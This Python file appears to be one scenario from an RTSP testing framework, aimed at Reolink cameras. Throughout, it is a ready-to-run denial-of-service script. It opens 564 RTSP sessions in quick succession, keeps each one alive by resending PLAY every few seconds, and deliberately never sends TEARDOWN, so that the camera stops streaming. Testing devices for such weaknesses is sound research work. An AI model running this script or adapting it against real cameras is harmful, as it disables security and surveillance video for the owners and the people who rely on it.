"""Reolink-specific RTSP scenario that runs only the streaming-stop phase."""

try:
    from scenario_imports import (
        RTSPClient,
        make_client,
        close_client,
        options_describe_get_control_url,
    )
except ImportError:
    from .scenario_imports import (
        RTSPClient,
        make_client,
        close_client,
        options_describe_get_control_url,
    )


def scenario_reolink_only_stop_streaming(
    client_id,
    server,
    port,
    path,
    user,
    password,
    timeout,
    duration,
    delay=1,
    wto=2,
):
    """
    REOLINK ONLY STOP STREAMING scenario.

    Opens exactly 564 connections. Each connection sends:
        OPTIONS -> DESCRIBE -> SETUP -> PLAY

    Then each successful connection sends PLAY every `wto` seconds.

    Important:
        - Connections are launched with the same Phase 1 delay: 0.1 seconds.
        - SETUP uses the same Reolink Phase 1 transport: NO_PORTS.
        - No RTSP TEARDOWN is sent.
        - A client is closed locally only after the server has closed/reset the
          connection, after a local connection/send error, or after duration
          expiry.
        - If `duration > 0`, the whole scenario ends after that global duration.
    """

    import threading
    import time

    # `client_id` and `delay` are kept in the signature for compatibility with
    # the scenario runner, but this scenario uses the fixed Phase 1 delay.
    _ = client_id
    _ = delay

    total_connections = 564
    inter_connection_delay = 0.1
    per_attempt_timeout = 60

    scenario_start_time = time.time()
    scenario_stop_event = threading.Event()
    stop_reason = {"printed": False}
    stop_reason_lock = threading.Lock()

    active_clients = []
    failed_clients = []
    closed_clients = []
    all_clients = []
    threads = []

    clients_lock = threading.Lock()

    def scenario_duration_expired():
        return duration > 0 and (time.time() - scenario_start_time) >= duration

    def request_scenario_stop(reason=None):
        scenario_stop_event.set()
        if reason:
            with stop_reason_lock:
                if not stop_reason["printed"]:
                    print(reason)
                    stop_reason["printed"] = True

    def check_duration(label):
        if scenario_duration_expired():
            request_scenario_stop(f"{label}: global duration reached; stopping scenario")
            return True
        return False

    def remember_client(client):
        with clients_lock:
            if client not in all_clients:
                all_clients.append(client)

    def mark_active(client):
        with clients_lock:
            if client not in active_clients:
                active_clients.append(client)

    def mark_failed(client):
        with clients_lock:
            if client not in failed_clients:
                failed_clients.append(client)

    def close_and_forget(client, label, error=None):
        """
        Close the local client after the server has closed/reset the connection,
        after a connection/send error, or after duration expiry.

        This should NOT send RTSP TEARDOWN. If close_client() sends TEARDOWN
        internally, replace close_client(client) with a raw socket close helper.
        """
        # Uncomment for verbose error logging.
        # if error is not None:
        #     print(f"{label}: connection error/server close detected - {error}")

        try:
            close_client(client)
        except Exception as close_error:
            print(f"{label}: error while closing local client - {close_error}")

        with clients_lock:
            if client in active_clients:
                active_clients.remove(client)

            if client not in closed_clients:
                closed_clients.append(client)

    def close_all_clients(name):
        with clients_lock:
            clients_to_close = list(active_clients)

        print(f"{name}: closing {len(clients_to_close)} active connections")

        for client in clients_to_close:
            close_and_forget(
                client,
                f"[{name}] Active connection",
            )

    def counts():
        with clients_lock:
            return (
                len(all_clients),
                len(active_clients),
                len(failed_clients),
                len(closed_clients),
            )

    def make_phase_client(connection_id):
        return make_client(
            RTSPClient,
            connection_id,
            server,
            port,
            path,
            user,
            password,
            timeout,
            udp_ports=False,
        )

    def start_daemon_thread(target, args):
        t = threading.Thread(
            target=target,
            args=args,
            daemon=True,
        )
        t.start()
        threads.append(t)
        return t

    def wait_for_attempt_events(attempt_events, total_timeout):
        """
        Wait for a group of attempt events using one shared deadline.
        This prevents N attempts from waiting N * total_timeout seconds.
        """
        if total_timeout is None:
            for event in attempt_events:
                event.wait()
            return len(attempt_events), 0

        deadline = time.time() + total_timeout
        completed = 0

        for event in attempt_events:
            remaining = deadline - time.time()
            if remaining <= 0:
                break

            if event.wait(timeout=remaining):
                completed += 1

        return completed, len(attempt_events) - completed

    def play_loop(client, label, attempt_done_event=None):
        """
        Sends PLAY every `wto` seconds on an already SETUP/PLAYed connection.
        """
        if attempt_done_event is not None:
            attempt_done_event.set()

        next_play_time = time.time() + wto

        while not scenario_stop_event.is_set():
            if check_duration(label):
                close_and_forget(client, label)
                return

            current_time = time.time()

            if current_time >= next_play_time:
                try:
                    client.send_play()
                    next_play_time = current_time + wto

                except Exception as e:
                    close_and_forget(client, label, e)
                    return

            time.sleep(0.1)

        close_and_forget(client, label)

    def run_stop_streaming_connection(connection_id, attempt_done_event):
        label = f"[REOLINK ONLY STOP STREAMING] Connection {connection_id}"
        client = make_phase_client(connection_id)
        remember_client(client)

        try:
            if scenario_stop_event.is_set():
                attempt_done_event.set()
                return

            client.connect()
            mark_active(client)

            control_url = options_describe_get_control_url(client)
            client.send_setup(control_url, transport_mode="NO_PORTS")
            client.send_play()

            play_loop(
                client,
                label,
                attempt_done_event,
            )

        except Exception as e:
            mark_failed(client)
            attempt_done_event.set()

            close_and_forget(
                client,
                label,
                e,
            )
            return

    def launch_stop_streaming_connections(name="PHASE 1"):
        print(
            f"{name}: launching exactly {total_connections} connections "
            f"with {inter_connection_delay} seconds delay..."
        )

        attempt_events = []
        launched = 0

        for connection_id in range(total_connections):
            if check_duration(name) or scenario_stop_event.is_set():
                break

            attempt_done_event = threading.Event()
            attempt_events.append(attempt_done_event)

            try:
                start_daemon_thread(
                    run_stop_streaming_connection,
                    (connection_id, attempt_done_event),
                )
            except RuntimeError as e:
                attempt_done_event.set()
                print(f"{name}: could not start attempt {connection_id}: {e}")
                time.sleep(inter_connection_delay)
                continue

            launched += 1
            time.sleep(inter_connection_delay)

        completed, timed_out = wait_for_attempt_events(
            attempt_events,
            per_attempt_timeout,
        )

        print(
            f"{name}: phase attempt wait complete. "
            f"launched={launched}, completed={completed}, timed_out={timed_out}"
        )

    launch_stop_streaming_connections("PHASE 1")

    print("Only stop-streaming phase launched.")

    try:
        while not scenario_stop_event.is_set():
            if check_duration("Monitor"):
                break

            time.sleep(10)

            (
                total_clients,
                active_count,
                failed_count,
                closed_count,
            ) = counts()

            print(
                f"Monitor: active={active_count}, "
                f"failed={failed_count}, "
                f"closed={closed_count}, "
                f"total_clients={total_clients}"
            )

    except KeyboardInterrupt:
        request_scenario_stop("Interrupted by user.")

    finally:
        request_scenario_stop()
        close_all_clients("FINAL CLEANUP")

        (
            total_clients,
            active_count,
            failed_count,
            closed_count,
        ) = counts()

        print(
            f"Final summary: active={active_count}, "
            f"failed={failed_count}, "
            f"closed={closed_count}, "
            f"total_clients={total_clients}"
        )
